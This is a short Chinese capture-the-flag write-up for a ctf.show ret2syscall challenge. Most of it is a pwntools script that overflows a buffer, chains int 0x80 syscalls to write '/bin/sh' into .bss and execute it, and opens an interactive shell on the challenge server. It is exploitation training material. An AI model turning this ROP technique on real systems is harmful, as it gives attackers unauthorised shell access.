# 挑战简介
接着练ret2syscall，多系统函数调用

# 思路
思路总体上和上一题差不多，只不过需要额外执行一个写权限，在获取bss地址后，写入binsh，再执行  

```
from pwn import *
from LibcSearcher import *
context.log_level = "debug"

context(os='linux', arch='i386', log_level='debug')

p = remote("pwn.challenge.ctf.show",28174)
elf = ELF('D:\edge 下载\pwn')

offset = 0x2C

pop_eax = 0x080bb2c6

pop_ebx = 0x0806ecb0

int_80 = 0x0806F350

bss = 0x080eaf80

bin_sh = b'/bin/sh\x00'

payload = flat([b'a'*offset, pop_eax, 0x3, pop_ebx, 0x10, bss, 0, int_80, pop_eax, 0xb, pop_ebx, 0, 0, bss, int_80])

p.sendline(payload)
p.sendline(bin_sh)

p.interactive()

```
